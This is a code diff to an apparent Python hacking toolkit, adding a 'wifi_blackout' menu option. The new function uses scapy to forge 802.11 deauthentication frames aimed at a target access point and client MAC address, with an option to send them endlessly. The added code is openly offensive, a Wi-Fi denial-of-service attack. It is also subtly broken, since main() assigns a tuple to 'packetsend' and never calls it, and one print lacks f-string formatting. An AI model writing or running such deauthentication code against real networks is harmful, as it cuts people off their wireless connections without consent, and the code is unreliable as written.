@@ -6,6 +6,8 @@ from multiprocessing import Pool, cpu_count
 import sys
 import time
 import os
+import argparse
+from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
 ascii_zero = (r"""
        █████████████████
@@ -110,6 +112,36 @@ def pass_gen():
         passw = random.choice(senhap)
         senhag.append(passw)
     print ("".join(senhag))
+def wifi_blackout():
+    def args():
+        parser = argparse.ArgumentParser(description="WIFI Attack Deauth")
+        parser.add_argument("-i", "--interface", dest="interface", help="WIFI interface")
+        parser.add_argument("-a", "--ap", dest="bssid_ap", help="MAC from target")
+        parser.add_argument("-c", "--client", dest="bssid_client", help="MAC from client")
+        parser.add_argument("-n", "--count", dest="count", type=int, default=10, help="Packets count(0 for infinite)")
+        parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Time between packets")
+        options = parser.parse_args()
+        return options
+    def BDP(ap_mac, client_mac):
+        packet = (
+            RadioTap()/
+            Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)/
+            Dot11Deauth(reason=7)
+        )
+        return packet
+    def packetsend(packet, interface, count, interval):
+        if count == 0:
+            print("[INFO]Sending packets for ∞ times... CTRL+C to stop it")
+            sendp(packet, iface=interface, count=count, inter=interval, loop=1, verbose=1)
+        else:
+            print("[INFO]Sending packets for {count} times")
+            sendp(packet, iface=interface,count=count, inter=interval, verbose=1)
+    def main():
+        options = args()
+        pkt = BDP(options.bssid_ap, options.bssid_client)
+        packetsend = (pkt, options.interface, options.count, options.interval)
+    if __name__ == "__main__":
+        main()
 
 def win():
     rec = input("")
@@ -129,8 +161,13 @@ def win():
             """)
         pass_gen()
         return True
-    elif rec == "oigatum":
-        
+    elif rec == "wifiblackout":
+        print("""
+            ######################
+            #    WIFI-BLACKOUT   #
+            ######################
+""")        
+        wifi_blackout()
         return True
     else:
         return False
